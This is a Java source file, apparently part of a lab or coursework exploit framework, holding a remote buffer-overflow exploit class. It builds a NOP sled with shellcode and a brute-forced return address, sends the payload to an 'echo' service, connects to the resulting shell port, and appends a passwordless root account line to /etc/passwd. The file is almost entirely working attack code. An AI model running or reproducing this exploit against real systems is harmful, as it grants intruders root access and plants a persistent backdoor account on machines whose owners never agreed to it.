
public class BufferOverflowExploit extends Exploit{
	
	BufferOverflow buffover;
	
	
	public BufferOverflowExploit(String user, String filepath, String IP){
		super(user, filepath, IP);
		buffover = new BufferOverflow();
	}
	
	protected boolean getRootAccess(){
		
		
		System.out.println("begin creating byte array: " + buffover.shellCode.length);
		
		//make the code to send
		byte[] cmd = new byte[BufferOverflow.PACKET_LENGTH];
		int index = 0;
		while(index < BufferOverflow.NOP_BUFFER_LENGTH){
			cmd[index] = BufferOverflow.NOP;
			index++;
		}
		
		while(index < BufferOverflow.NOP_BUFFER_LENGTH + buffover.shellCode.length){
			cmd[index] = buffover.shellCode[index - BufferOverflow.NOP_BUFFER_LENGTH];
			index++;
		}
		
		while(index < 1036){
			cmd[index] = BufferOverflow.NOP;
			index++;
		}
		
		boolean success = false;
		for(int addr = BufferOverflow.START_ADDRESS; addr <= BufferOverflow.END_ADDRESS; addr += 512){
			for(int i = 0; i < 4; i ++){
				cmd[index + i] = (byte) (addr >>> (8*i));
			}
			
			//Send the shell code to "echo" service.
			if(!buffover.connect(ip, BufferOverflow.ECHO_PORT))
				return false;
			
			
			if(!buffover.sendCommands(cmd))
				return false;
			
			//Connect to the remote shell
			buffover = new BufferOverflow();
			try{
				if(buffover.connect(ip, BufferOverflow.SHELL_PORT))
					success = true;
				
				String[] makeRoot = {"echo " + dusr+"::0:0::/:/bin/sh >> /etc/passwd\n\0"};
				if(!buffover.sendCommands(makeRoot))
					return false;
				
				break;
			}catch(Exception e){
				System.out.println("failed: addr: " + addr);
				continue;
			}
		}
		
		
		System.out.println("success: " + success);
		return success;
	}
}
